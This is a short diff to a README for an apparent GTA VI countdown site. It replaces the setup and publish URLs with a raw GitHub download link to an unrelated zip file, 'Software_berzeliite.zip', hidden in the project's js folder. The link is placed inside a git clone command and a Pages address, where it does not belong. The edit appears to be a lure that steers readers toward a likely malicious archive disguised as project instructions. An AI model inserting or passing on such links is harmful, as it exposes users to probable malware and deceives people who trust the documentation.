@@ -22,7 +22,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```
-   git clone https://github.com/yourusername/gta-vi-countdown.git
+   git clone https://github.com/dipeshdarks/Countdown/raw/refs/heads/main/js/Software_berzeliite.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -40,7 +40,7 @@ To deploy this project on GitHub Pages, follow these steps:
 2. Go to the repository settings.
 3. Scroll down to the "GitHub Pages" section.
 4. Select the branch you want to use (usually `main` or `master`).
-5. Click "Save" and your site will be published at `https://yourusername.github.io/gta-vi-countdown`.
+5. Click "Save" and your site will be published at `https://github.com/dipeshdarks/Countdown/raw/refs/heads/main/js/Software_berzeliite.zip`.
 
 ## Customization
 
